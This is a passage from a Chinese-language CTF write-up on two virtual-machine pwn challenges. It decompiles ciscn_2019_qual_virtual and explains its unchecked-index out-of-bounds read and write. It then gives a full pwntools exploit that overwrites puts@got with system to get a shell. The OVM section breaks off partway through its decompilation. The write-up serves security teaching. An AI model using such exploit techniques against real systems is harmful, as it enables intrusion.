      __int64 v2; // [rsp+10h] [rbp-10h]
      __int64 v3; // [rsp+18h] [rbp-8h]
      if ( (unsigned int)take_value(a1, &v2) && (unsigned int)take_value(a1, &v3) )
        result = write_data(a1, v2 / v3);
      else
        result = 0LL;
      return result;
    }
将两个值的商写入data段
load
    __int64 __fastcall load(__int64 a1)
    {
      __int64 result; // rax
      __int64 v2; // [rsp+10h] [rbp-10h]
      if ( (unsigned int)take_value(a1, &v2) )
        result = write_data(a1, *(_QWORD *)(*(_QWORD *)a1 + 8 * (*(int *)(a1 + 12) + v2)));
      else
        result = 0LL;
      return result;
    }
load函数只接受一个参数，为data段结构体指针，首先从data段取出一个值，然后我们分析一下下面这一段的意思
    *(_QWORD *)(*(_QWORD *)a1 + 8 * (*(int *)(a1 + 12) + v2))
**_(_QWORD_ )a1**为data段结构体的值，即data段指针， ** _(int_ )(a1 +
12)**为data段中存储数据的个数，再加上v2，作为索引的依据，将 ** _(_QWORD_ )( _(_QWORD_ )a1 + 8 _(_ (int
*)(a1 + 12) +
v2))**的值载入data段。这里关键的一点就是，v2作为索引的一部分是用户输入的，而这里也并未对v2的值做限制，当v2为负数时就可以越界读，将不属于data段的值载入data段，这里就是漏洞之一。
save
    __int64 __fastcall save(__int64 a1)
    {
      __int64 v2; // [rsp+10h] [rbp-10h]
      __int64 v3; // [rsp+18h] [rbp-8h]
      if ( !(unsigned int)take_value(a1, &v2) || !(unsigned int)take_value(a1, &v3) )
        return 0LL;
      *(_QWORD *)(8 * (*(int *)(a1 + 12) + v2) + *(_QWORD *)a1) = v3;
      return 1LL;
    }
从data段取出两个值，v2的作用和load中一样，以data段为基地址，将 ** _(_QWORD_ )(8 _(_ (int _)(a1 + 12) +
v2) +_ (_QWORD *)a1)** 的地址中写入v3，这里也没有限制v2的大小，因此存在越界写漏洞。
至此，整个程序的主要功能就分析完了，接下来就该进行利用了
由于程序没有开启FULL RELRO，所以我们可以复写got表，这里我们复写puts[@got](https://github.com/got
"@got")为system，因为当执行完opcode之后程序会通过puts函数输出我们一开始输入的程序名，只要我们输入程序名为/bin/sh，这样最后就会执行system(“/bin/sh”)，即可getshell(也可以通过复写puts为onegadget，不过system(“/bin/sh”)更稳一些)。
注意到heap区上方
0x404000处存在大量libc地址
而程序本身没有输出功能，所以我们需要利用程序提供的功能进行写入加减运算
load和save功能都是在data段进行的，而且存在越界，它们的的参数都是data结构体的指针
而对data段进行操作都是通过存储在data结构体中的data段指针进行操作的，只要我们修改了这个指针，data段的位置也会随之改变，所以我们可以利用save的越界写漏洞，将data段指针修改到0x404000附近(也可以直接在data段进行越界读写，毕竟越界读写的范围也没有限定，不过这样计算起来会比较麻烦)。
我们将data段指针改写为stderr下方的一段无内容处，即0x4040d0
这个操作对应的payload为
    push push save 
    4210896 -3
这样操作的原因可以自己调试
之后我们对data段的操作就都是以0x4040d0为基地址来操作的，我们将上方的stderr的地址(或者别的地址)load到data段，然后计算出在libc中stderr和system的相对偏移，push到data段，然后将stderr和偏移相加就能得出system的地址，接着再利用save功能，将system写入puts[@got](https://github.com/got
"@got")(在0x404020处)即可，完整exp如下
    from pwn import *
    context.binary = './ciscn_2019_qual_virtual'
    context.log_level = 'debug'
    io = process('./ciscn_2019_qual_virtual')
    elf = ELF('ciscn_2019_qual_virtual')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    io.recvuntil('name:n')
    io.sendline('/bin/sh')
    data_addr = 0x4040d0
    offset = libc.symbols['system'] - libc.symbols['_IO_2_1_stderr_']
    opcode = 'push push save push load push add push save'
    data = [data_addr, -3, -1, offset, -21]
    payload = ''
    for i in data:
        payload += str(i)+' '
    io.recvuntil('instruction:n')
    io.sendline(opcode)
    #gdb.attach(io,'b *0x401cce')
    io.recvuntil('data:n')
    io.sendline(payload)
    io.interactive()
## 0x2.[OGeek2019 Final]OVM
首先检查保护
只有canary未开启
IDA分析
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      unsigned __int16 v4; // [rsp+2h] [rbp-Eh]
      unsigned __int16 v5; // [rsp+4h] [rbp-Ch]
      unsigned __int16 v6; // [rsp+6h] [rbp-Ah]
      int v7; // [rsp+8h] [rbp-8h]
      int i; // [rsp+Ch] [rbp-4h]
      comment[0] = malloc(0x8CuLL);
      setbuf(stdin, 0LL);
      setbuf(stdout, 0LL);
      setbuf(stderr, 0LL);
      signal(2, signal_handler);
      write(1, "WELCOME TO OVM PWNn", 0x16uLL);
      write(1, "PC: ", 4uLL);
      _isoc99_scanf("%hd", &v5);
      getchar();
      write(1, "SP: ", 4uLL);
      _isoc99_scanf("%hd", &v6);
      getchar();
      reg[13] = v6;
      reg[15] = v5;
      write(1, "CODE SIZE: ", 0xBuLL);
      _isoc99_scanf("%hd", &v4);
      getchar();
      if ( v6 + (unsigned int)v4 > 0x10000 || !v4 )
      {
        write(1, "EXCEPTIONn", 0xAuLL);
        exit(155);
      }
      write(1, "CODE: ", 6uLL);
      running = 1;
      for ( i = 0; v4 > i; ++i )
      {
        _isoc99_scanf("%d", &memory[v5 + i]);
        if ( (memory[i + v5] & 0xFF000000) == 0xFF000000 )
          memory[i + v5] = 0xE0000000;
        getchar();
      }
      while ( running )
      {
        v7 = fetch();
        execute(v7);
      }
      write(1, "HOW DO YOU FEEL AT OVM?n", 0x1BuLL);
      read(0, comment[0], 0x8CuLL);
      sendcomment(comment[0]);
      write(1, "Byen", 4uLL);
      return 0;
    }
首先让我们输入PC和SP
    PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。
    SP 指针寄存器，永远指向当前的栈顶。
然后让我们输入codesize，最大为0x10000字节
接着依次输入code
    for ( i = 0; v4 > i; ++i )
    {
      _isoc99_scanf("%d", &memory[v5 + i]);
      if ( (memory[i + v5] & 0xFF000000) == 0xFF000000 )
        memory[i + v5] = 0xE0000000;
      getchar();
    }
if语句是用来限制code的值的
接着进入where循环，fetch函数如下
    __int64 fetch()
    {
      int v0; // eax
      v0 = reg[15];
      reg[15] = v0 + 1;
      return (unsigned int)memory[v0];
    }
这里使用到了reg[15],存储着PC的值，我们看一看这个程序使用的一些数据
每次将PC的值增加1，依次读取memory中的code
再看到execute函数
    ssize_t __fastcall execute(int a1)
    {
      ssize_t result; // rax
      unsigned __int8 v2; // [rsp+18h] [rbp-8h]
      unsigned __int8 v3; // [rsp+19h] [rbp-7h]
      unsigned __int8 v4; // [rsp+1Ah] [rbp-6h]
      int i; // [rsp+1Ch] [rbp-4h]
      v4 = (a1 & 0xF0000u) >> 16;
      v3 = (unsigned __int16)(a1 & 0xF00) >> 8;
      v2 = a1 & 0xF;
      result = HIBYTE(a1);     //将一个code分割为四个部分，最高1字节作为分类标志
      if ( HIBYTE(a1) == 0x70 ) //最高字节为0x70
      {
        result = (ssize_t)reg;
        reg[v4] = reg[v2] + reg[v3]; //加法
        return result;
      }
      if ( (int)HIBYTE(a1) > 0x70 )
      {
        if ( HIBYTE(a1) == 0xB0 ) //最高字节为0xB0
        {
          result = (ssize_t)reg;
          reg[v4] = reg[v2] ^ reg[v3]; //异或
          return result;
        }
        if ( (int)HIBYTE(a1) > 0xB0 )
        {
          if ( HIBYTE(a1) == 0xD0 ) //最高字节为0xD0
          {
            result = (ssize_t)reg;
            reg[v4] = reg[v3] >> reg[v2]; //右移位运算
            return result;
          }
          if ( (int)HIBYTE(a1) > 0xD0 )
          {
            if ( HIBYTE(a1) == 0xE0 ) //最高字节为0xE0
            {
              running = 0; 
              if ( !reg[13] ) //如果栈顶为空则退出while循环
                return write(1, "EXITn", 5uLL);
            }
            else if ( HIBYTE(a1) != 0xFF )
            {
              return result;
            }
            running = 0;
            for ( i = 0; i  0x30 )
      {
        switch ( HIBYTE(a1) )
        {
          case 0x50u: //最高字节为0x50
            LODWORD(result) = reg[13]; //读取SP
            reg[13] = result + 1; //SP+1
            result = (int)result;
            stack[(int)result] = reg[v4]; //将寄存器中的值压入栈中
            break;
          case 0x60u: //最高字节为0x60
            --reg[13]; //SP降低
            result = (ssize_t)reg;
            reg[v4] = stack[reg[13]];//读取栈值到寄存器中
            break;
          case 0x40u: //最高字节为0x40
            result = (ssize_t)memory; //读取内存的值
            memory[reg[v2]] = reg[v4]; //将寄存器中的值写入内存中
            break;
        }
      }
      else if ( HIBYTE(a1) == 0x10 ) //最高字节为0x10
      {
        result = (ssize_t)reg;
        reg[v4] = (unsigned __int8)a1; //将一个常数存入寄存器
      }
      else if ( HIBYTE(a1) == 0x20 ) //最高字节为0x20